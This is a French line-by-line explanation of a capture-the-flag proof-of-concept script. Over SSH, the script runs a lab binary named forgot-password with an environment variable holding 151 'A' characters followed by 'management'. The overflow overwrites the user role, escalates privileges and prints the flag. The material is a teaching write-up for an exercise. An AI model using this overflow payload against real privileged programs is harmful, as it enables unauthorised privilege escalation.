# Explication détaillée - poc_challenge4.py

## Script 4 : poc_challenge4.py (Environment Variable Overflow sur forgot-password)

### Ligne par ligne

**Ligne 1** : `#!/usr/bin/env python3` - Shebang indiquant l'interpréteur Python 3

**Ligne 2** : `# POC - ECORP Challenge Envir0n (forgot-password)` - Commentaire décrivant le POC

**Ligne 4** : `import paramiko` - Importe le module paramiko pour la connexion SSH

**Ligne 5** : `import getpass` - Importe le module pour la saisie sécurisée de mots de passe

**Ligne 6** : `import re` - Importe le module pour les expressions régulières (extraction du flag)

**Ligne 7** : `import sys` - Importe le module pour les fonctions système (exit)

**Ligne 8** : `import time` - Importe le module pour les fonctions de temps (non utilisé dans ce script mais importé par habitude)

**Ligne 10** : `BINARY = "/opt/intern/forgot-password"` - Variable contenant le chemin du binaire vulnérable

**Ligne 11** : `PAYLOAD = "A" * 151 + "management"` - Variable contenant le payload : 151 caractères "A" suivis de "management" pour overflow de variable d'environnement et écraser le rôle utilisateur

**Ligne 13** : `# Connexion SSH` - Commentaire de section

**Ligne 14** : `def connect_ssh():` - Définit la fonction de connexion SSH

**Ligne 15** : `print("\n[*] Connexion SSH...")` - Affiche un message indiquant l'étape

**Ligne 16** : `ssh_host = input("    Host (ex: ecorp.cyber.epitest.eu) : ").strip()` - Demande l'hôte SSH et retire les espaces

**Ligne 17** : `ssh_port = int(input("    Port                             : ").strip())` - Demande le port, convertit en entier et retire les espaces

**Ligne 18** : `ssh_user = input("    Utilisateur                      : ").strip()` - Demande l'utilisateur et retire les espaces

**Ligne 19** : `ssh_pass = getpass.getpass("    Mot de passe                     : ")` - Demande le mot de passe de façon sécurisée

**Ligne 21** : `client = paramiko.SSHClient()` - Crée un client SSH

**Ligne 22** : `client.set_missing_host_key_policy(paramiko.AutoAddPolicy())` - Configure pour accepter automatiquement les clés hôtes inconnues

**Ligne 23** : `try:` - Début du bloc try pour la connexion

**Ligne 24** : `client.connect(ssh_host, port=ssh_port, username=ssh_user, password=ssh_pass)` - Établit la connexion SSH

**Ligne 25** : `print(f"[+] Connecté en SSH sur {ssh_host}:{ssh_port} !")` - Affiche le succès de la connexion

**Ligne 26** : `return client` - Retourne le client connecté

**Ligne 27** : `except Exception as e:` - Capture toute exception

**Ligne 28** : `print(f"[!] Erreur SSH : {e}")` - Affiche l'erreur

**Ligne 29** : `sys.exit(1)` - Quitte avec un code d'erreur

**Ligne 31** : `# Exploitation` - Commentaire de section

**Ligne 32** : `def exploit(client, path):` - Définit la fonction d'exploitation

**Ligne 33** : `print(f"\n[*] Lancement du binaire {path} avec variable d'environnement DEHASH...")` - Affiche un message indiquant l'utilisation de variable d'environnement

**Ligne 35** : `command = f'DEHASH="{PAYLOAD}" {path}'` - Construit la commande shell qui définit la variable d'environnement DEHASH avec le payload avant d'exécuter le binaire

**Ligne 36** : `stdin, stdout, stderr = client.exec_command(command)` - Exécute la commande via SSH

**Ligne 37** : `output = stdout.read().decode(errors="replace") + stderr.read().decode(errors="replace")` - Lit stdout et stderr, décode et concatène les deux sorties

**Ligne 38** : `print(f"\n[+] Output complet :\n{output}")` - Affiche la sortie complète

**Ligne 39** : `return output` - Retourne la sortie

**Ligne 41** : `def extract_flag(output):` - Définit la fonction d'extraction du flag

**Ligne 42** : `match = re.search(r'EPI\{[^}]+\}', output)` - Cherche le pattern EPI{...} avec regex

**Ligne 43** : `if match:` - Si trouvé

**Ligne 44** : `return match.group(0)` - Retourne le flag

**Ligne 45** : `return None` - Sinon retourne None

**Ligne 47** : `def main():` - Définit la fonction principale

**Ligne 48-50** : Affiche le titre du POC

**Ligne 51** : `client = connect_ssh()` - Appelle la fonction de connexion SSH

**Ligne 52** : `binary_path = BINARY` - Utilise le chemin par défaut du binaire

**Ligne 53** : `output = exploit(client, binary_path)` - Appelle la fonction d'exploitation

**Ligne 54** : `flag = extract_flag(output)` - Appelle la fonction d'extraction du flag

**Ligne 55** : `client.close()` - Ferme la connexion SSH

**Ligne 56** : `if flag:` - Si le flag est trouvé

**Ligne 57-59** : Affiche le flag encadré

**Ligne 61** : `else:` - Sinon

**Ligne 61** : `print("[!] Flag non trouvé dans la sortie.")` - Affiche un message d'erreur

**Ligne 62** : `print("[~] Output brut :")` - Affiche un message

**Ligne 63** : `print(repr(output))` - Affiche la représentation brute de la sortie

**Ligne 65** : `if __name__ == "__main__":` - Vérifie si le script est exécuté directement

**Ligne 66** : `main()` - Appelle la fonction principale

---

## Résumé du fonctionnement

Ce script automatise l'exploitation d'une vulnérabilité de buffer overflow via variable d'environnement sur le binaire forgot-password. Il :

1. Se connecte en SSH au serveur distant avec les identifiants fournis
2. Exécute le binaire forgot-password avec une variable d'environnement DEHASH définie
3. La variable d'environnement contient un payload de 151 caractères "A" suivis de "management"
4. Le binaire lit la variable d'environnement DEHASH
5. Le buffer overflow écrase la variable stockant le rôle utilisateur dans la mémoire du programme
6. La chaîne "management" écrase le rôle, donnant des privilèges élevés
7. Avec les privilèges élevés, le binaire révèle des informations sensibles incluant le flag
8. Extrait et affiche le flag EPI{...}

**Différences clés avec les scripts 2 et 3** :
- Pas besoin d'interaction PTY (pas d'attente de prompt)
- L'exploitation se fait via variable d'environnement, pas via input utilisateur
- La commande est exécutée directement avec `client.exec_command()` sans canal interactif
- Le binaire lit la variable d'environnement au démarrage, pas pendant l'exécution
- Plus simple et plus direct que les exploits nécessitant une interaction

**Comparaison des 4 scripts** :
- **Script 1** : Vulnérabilité de divulgation d'informations par stéganographie dans PDF (HTTP)
- **Script 2** : Buffer overflow massif via input utilisateur avec interaction PTY (SSH)
- **Script 3** : Buffer overflow ciblé pour activer un mode debug via input utilisateur (SSH)
- **Script 4** : Buffer overflow via variable d'environnement pour élévation de privilèges (SSH, sans interaction)
